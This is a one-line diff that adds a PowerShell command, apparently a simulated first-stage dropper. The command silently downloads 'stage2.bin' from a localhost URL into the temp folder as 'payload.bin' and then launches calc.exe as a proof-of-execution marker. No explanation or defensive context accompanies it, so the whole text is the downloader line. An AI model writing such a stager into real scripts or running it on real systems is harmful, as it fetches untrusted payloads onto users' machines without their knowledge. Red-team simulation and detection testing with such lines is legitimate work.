@@ -1,0 +1,1 @@
+$Stage1Url = 'https://localhost:9001/stage2.bin'; $DownloadPath = "$env:TEMP\payload.bin"; curl.exe -s -L -o $DownloadPath $Stage1Url; Start-Process -FilePath 'calc.exe'; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
